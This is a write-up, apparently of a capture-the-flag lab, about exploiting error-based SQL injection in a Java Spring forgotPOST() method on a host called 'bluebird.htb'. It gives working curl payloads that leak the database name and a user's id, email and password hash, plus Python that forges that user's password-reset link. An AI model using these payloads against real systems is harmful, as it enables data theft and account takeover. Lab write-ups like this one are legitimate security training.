---
tags: [writeup, pentest-report, how-to, recon-value-assessment]
companion_to: EXPECTED_FINDINGS.md, tests/common_character_bypass_writeup.md
last_updated: 2026-07-04
---

# How-To: Recovering `passwordResetLink` via Error-Based SQL Injection in `forgotPOST()`

I was assigned this task: look at how BlueBird's `forgotPOST()` method
builds a password-reset link, then use error-based SQL injection against
`10.129.1.42:8080` to dump whatever's needed to state what the
`passwordResetLink` value would be for the user `potus4`. I hadn't been
given a walkthrough for this one — just the target and the question — so
everything below is exactly what I actually ran and found, in order,
including the parts where my first assumption turned out wrong. The
answer, confirmed at the end: `https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56`.

You'll need a terminal with `curl` and `python3`, and (for step 1) a copy
of this repo with recon already run against BlueBird's source.

## Step 1 — Check what recon already flagged for this method

**Why:** same reason as any other engagement — before reading the whole
application by hand, I let the automated source reviewer tell me where to
look first.

```bash
sqlite3 -header -column data/recon.db \
  "SELECT symbol_name_raw, sink_type, confidence, validation_desc
   FROM triage_results WHERE symbol_name_raw = 'forgotPOST';"
```

Real output:
```
symbol_name_raw  sink_type   confidence  validation_desc
---------------  ----------  ----------  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
forgotPOST       sql_unsafe  high        The method takes a request parameter 'email'. It checks if the email is empty and if it matches an email pattern. If it does not match, it redirects to the forgot page with an error message. If it does match, it queries the database using string concatenation.
```

**What this told me, and one thing worth noting:** same plain-language
translation as before — this method builds a database command by pasting
in the `email` parameter directly, flagged high-confidence. But this time,
unlike the last engagement, the summary actually *did* mention that a
check exists ("checks if the email is empty and if it matches an email
pattern") — it just didn't say whether that check is any good. That's a
real, useful distinction to notice: recon's write-up quality isn't
uniformly bad, it varies method to method, which is exactly why I still
read the actual code myself rather than trusting any one summary at face
value.

I also checked whether a second automated pass (one that cross-checks the
first summary against the raw structural facts, rather than trusting it)
had anything to add:

```bash
sqlite3 -header -column data/recon.db \
  "SELECT ar.status, ar.notes FROM audit_results ar
   WHERE ar.symbol_id = (SELECT symbol_id FROM symbols WHERE name='forgotPOST');"
```
```
status   notes
-------  -----------------------------------------------------------------------------------------------------------------
matched  The TRIAGE CLAIM says sink_type=sql_unsafe, but STAGE0 FACTS shows no callee names flagged as potentially unsafe.
```

In plain terms: this second check is saying "the first summary's claim
turns out to be right, but I can't independently prove that from the raw
structural facts alone — nothing in the plain code structure by itself
screams 'unsafe' the way it would for an obviously bad pattern." That's
healthy skepticism, not a contradiction — the claim held up under later
scrutiny (see Step 2), but it's worth knowing the tool flagged its own
uncertainty rather than rubber-stamping the first answer.

## Step 2 — Read the real method and the page that renders errors

**Why:** I want to know exactly what stands between the `email` parameter
and the database, and — specifically for an error-based approach — whether
this application actually shows database errors to the outside world at
all. If it doesn't, error-based SQL injection isn't the right technique
here regardless of what the summary says.

```java
@PostMapping({"/forgot"})
public String forgotPOST(@RequestParam String email, Model model, HttpServletResponse response) throws IOException {
   if (email.isEmpty()) { /* redirect: "Please fill out all fields" */ }
   Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
   Matcher m = p.matcher(email);
   if (!m.matches()) { /* redirect: "Invalid email!" */ }
   try {
      String sql = "SELECT * FROM users WHERE email = '" + email + "'";
      User user = (User) this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
      Long uid = user.getId();
      String passwordResetHash = DigestUtils.md5DigestAsHex((uid + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());
      String passwordResetLink = "https://bluebird.htb/reset?uid=" + uid + "&code=" + passwordResetHash;
      logger.error("TODO- Send email with link [" + passwordResetLink + "]");
      // redirects: "check your email for the reset link" -- link is only ever logged, never returned
   } catch (EmptyResultDataAccessException e) {
      // redirects: "Email does not exist"
   } catch (Exception e) {
      model.addAttribute("errorMsg", e.getMessage());
      model.addAttribute("errorStackTrace", Arrays.toString(e.getStackTrace()));
      return "error";  // renders a page showing both attributes
   }
}
```

**Two things this told me, and why each one matters:**

1. **`passwordResetLink` is not something a query can just dump — it has to
   be recomputed.** It's built from three ingredients (the user's numeric
   `id`, their `email`, and their stored `password` — which is a hashed
   value, not their real plaintext password) run through a specific
   formula (`MD5(id + ":" + email + ":" + password)`), and the only place
   the finished link ever goes is a server-side log line a remote attacker
   can't read. So the actual task isn't "find one leaked value" — it's
   "extract those three ingredients for `potus4`, then do the same
   calculation the application does." I made a note to come back to this
   exact formula in Step 4.
2. **This application does leak errors to the outside world — but only for
   `forgotPOST`, and it's worth confirming, not assuming.** I checked the
   template that renders when something goes wrong:
   ```html
   <pre th:text="${errorMsg}" style="..."></pre>
   <pre th:text="${errorStackTrace}" style="..."></pre>
   ```
   Both of those model values get written straight into the page. That's
   the whole precondition for "error-based" SQL injection to be worth
   trying here at all: if a malformed value makes the database complain,
   the complaint — potentially including data the complaint quotes —
   comes right back in the HTTP response, not hidden in a server log like
   `/find-user`'s equivalent case in the previous engagement.

## Step 3 — Try the automated dynamic test first, and understand exactly why it came back empty-handed

**Why I tried this before testing by hand:** `/forgot` doesn't require
being logged in (unlike `/find-user` last time), so I expected the
automated live-testing feature to actually have a fair shot here.

```bash
.venv/bin/python -m pipeline.cli dynamic-probe --env-id <N> \
    --request-templates request-templates.json --no-llm-interpret --db data/recon.db
```

Real result: all four automated test values came back `rejected` —
including the one specifically designed to contain a stray quote mark,
which is exactly the kind of value I'd expect to break something *if* it
reached the database.

**Why, and this is a genuinely different reason than last time:** I looked
at the actual response the tool recorded for that quote-mark test, and it
was just the ordinary "Forgot Password" page again — not an error page.
That told me the value never reached the database at all. Looking back at
Step 2's code, I realized why: the automated tool's test values are
generic strings like `b7_single_quote_sq'x` — they don't look anything
like an email address, so `forgotPOST`'s own format check (the one
requiring an `@` and a domain-like ending) rejects them immediately,
before the vulnerable line ever runs. The tool isn't wrong that nothing
happened — nothing *did* happen, for a real, if narrow, reason: today's
automated tester doesn't shape its test values to fit a field's expected
format. I confirmed this by hand with one email-shaped value containing a
single quote:

```bash
curl -s -X POST http://<local-test-copy>/forgot --data-urlencode "email=x'@test.com"
```

That one *did* break the query and rendered a real database error in the
response — proving the automated "rejected" result was a false negative
caused by test-value shape, not a real safety confirmation, and confirming
the actual injection point is reachable once the value is shaped like a
real email.

## Step 4 — Register the real target, and confirm the automated exploitation tool needs the same missing piece

**Why:** consistent with how I approached the last engagement, I logged
this target with the part of this toolkit built for pointing at a real
host, to keep an auditable record of what's in scope.

```bash
python -m sqlmap_wrapper.cli register-target --host 10.129.1.42 --port 8080 --label "HTB-ErrorBasedSQLi" --authorize
python -m sqlmap_wrapper.cli import-candidates --file candidates.json
python -m sqlmap_wrapper.cli assign-target --candidate-id <N> --target-id 1
python -m sqlmap_wrapper.cli run-sqlmap --candidate-id <N> --output-dir out/forgot
```

Real preview it built:
```
sqlmap -u http://10.129.1.42:8080/forgot --batch --random-agent --level=3 --risk=2 --output-dir=out/forgot
```

**Why I didn't run this for real:** no `-p` (which field to attack), no
`--data` (what a valid request body even looks like), and no `--dbms`. For
the same structural reason as Step 3 — the automated pipeline had no
usable evidence to hand it, since every automated test value got rejected
before reaching the real injection point — this tool has nothing to go on
either. Running it as-is would just be guessing, so I moved to testing the
real target by hand instead.

## Step 5 — Confirm the filter and the error-leak channel against the real, live target

**Why these three specific tests:** a harmless, correctly-formatted but
nonexistent email (to see the normal "not found" behavior), a
badly-formatted one (to confirm the format check itself), and a
correctly-formatted one with a single quote mixed in (to confirm the
injection point, now that I know it needs to look like a real email).

```bash
curl -s -o /dev/null -w "status=%{http_code} redirect=%{redirect_url}\n" \
  -X POST http://10.129.1.42:8080/forgot --data-urlencode "email=nobody@test.com"

curl -s -o /dev/null -w "status=%{http_code} redirect=%{redirect_url}\n" \
  -X POST http://10.129.1.42:8080/forgot --data-urlencode "email=notanemail"

curl -s -X POST http://10.129.1.42:8080/forgot --data-urlencode "email=x'@test.com"
```

Real results:

| what I sent | what happened |
|---|---|
| a real-looking but made-up email | redirected — "Email does not exist" |
| text with no `@`/domain shape | redirected — "Invalid email!" |
| a real-looking email with one quote mark mixed in | **200, with a real database error rendered on the page**: `bad SQL grammar [SELECT * FROM users WHERE email = 'x'@test.com']` plus a full exception trace |

This confirms, on the real target, everything Step 2/3 predicted from
source: the format check is real but easy to satisfy, and a value that
breaks the query gets its error reflected straight back — the exact
channel error-based SQL injection needs.

## Step 6 — Prove the extraction technique on a harmless value before touching real user data

**Why prove it on something harmless first:** rather than immediately
targeting `potus4`'s data, I wanted to confirm the *technique* itself works
on this target, using a value I already know the answer to, so I'm not
debugging two unknowns (the technique and the target) at once. The
approach: PostgreSQL, when asked to convert a piece of text into a number
it can't actually convert, includes the offending text *in* its own error
message. If I can force the database to try converting something I choose
into a number, whatever I chose gets echoed back to me — even though the
original vulnerable field never displays query results directly.

```bash
curl -s -X POST http://10.129.1.42:8080/forgot \
  --data-urlencode "email=x' OR 1=CAST((SELECT current_database()) AS int)-- @a.com"
```

Real result: `ERROR: invalid input syntax for type integer: "bluebird"` —
the database's own name, leaked through a field that never normally shows
database output at all. The technique works. (Two small details worth
explaining: `OR`, not `AND`, makes sure the forced calculation actually
runs even though `x` matches no real email; and everything after `@a.com`
still has to look like a valid email, so the whole thing ends in a
real-looking address to satisfy the format check from Step 2/5.)

## Step 7 — Pull `potus4`'s id, email, and stored password hash in one request

**Why combine all three into one request instead of three separate ones:**
the same technique can ask for more than one piece of information at once
by joining them together into a single piece of text first, separated by a
character that won't be confused with the data itself. That's fewer
requests and less back-and-forth than asking for each value separately.

```bash
curl -s -X POST http://10.129.1.42:8080/forgot \
  --data-urlencode "email=x' OR 1=CAST((SELECT id||':'||email||':'||password FROM users WHERE username='potus4') AS int)-- @a.com"
```

Real result:
```
invalid input syntax for type integer: "10:james@usa.gov:$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a"
```

Reading that apart by the `:` separators I chose: `potus4`'s internal id is
`10`, their email on file is `james@usa.gov`, and their stored password
value is `$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a` — a
BCrypt hash, not a real password, which matters for the next step: the
formula from Step 2 uses whatever's actually stored in that column,
hashed or not.

## Step 8 — Recompute `passwordResetLink` using the exact formula read in Step 2

**Why this step is just arithmetic, not another request:** I already have
everything the application itself would use — I don't need to ask the
target anything else. I just need to run the same calculation it runs.

```python
import hashlib

uid = "10"
email = "james@usa.gov"
password = "$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a"

combined = f"{uid}:{email}:{password}"
code = hashlib.md5(combined.encode()).hexdigest()
print(f"https://bluebird.htb/reset?uid={uid}&code={code}")
```

Real output:
```
https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56
```

## Step 9 — The answer, and what this run actually showed about recon's value

**`passwordResetLink` for `potus4`:**
`https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56`

Stepping back, this engagement showed a different shape of "how much did
recon help" than the last one. Recon correctly and quickly flagged the
right method and, this time, even acknowledged a filter existed — genuinely
better than the flat "no validation" summary seen on a different endpoint
before. The automated live-testing attempt, and the automated exploitation
tool's own preview, both correctly declined to guess rather than reporting
a false pass — but both stalled on the exact same root cause: their
generic test values don't look like the specific kind of input (an email
address) this particular field demands, so nothing ever reached the real
injection point automatically. Recognizing *why* that happened, and
shaping a test value that would actually pass the filter, took reading the
method myself. And the final answer wasn't something any tool could have
handed over even in principle — `passwordResetLink` is a value computed on
the fly from three separately-extracted pieces of data, using a formula
that only exists in the source code, not the database. Recon pointed
reliably at the right five lines to read; understanding what to do with
them, and doing it, was still the pentester's job.
